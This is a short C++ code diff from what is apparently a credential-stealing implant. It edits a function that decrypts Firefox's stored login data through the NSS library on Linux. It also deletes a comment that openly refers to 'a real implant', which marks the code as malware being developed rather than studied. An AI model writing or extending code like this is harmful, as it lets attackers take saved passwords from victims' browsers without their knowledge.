@@ -64,6 +64,7 @@ namespace credential {
 #endif
 
         std::string DecryptFirefoxBlob(const std::string& b64Blob, void* ctx) {
+            (void)ctx;
 #ifdef LINUX
             if (!ctx) return "[Encrypted: " + b64Blob + "]";
             NSSContext* nss = (NSSContext*)ctx;
@@ -74,8 +75,6 @@ namespace credential {
 
             if (nss->decrypt(&input, &output, nullptr) == SECSuccess) {
                 std::string decrypted((char*)output.data, output.len);
-                // NSS allocates output.data, but we don't have PR_Free.
-                // In a real implant we would find PR_Free in libnspr4.so.
                 return decrypted;
             }
 #endif
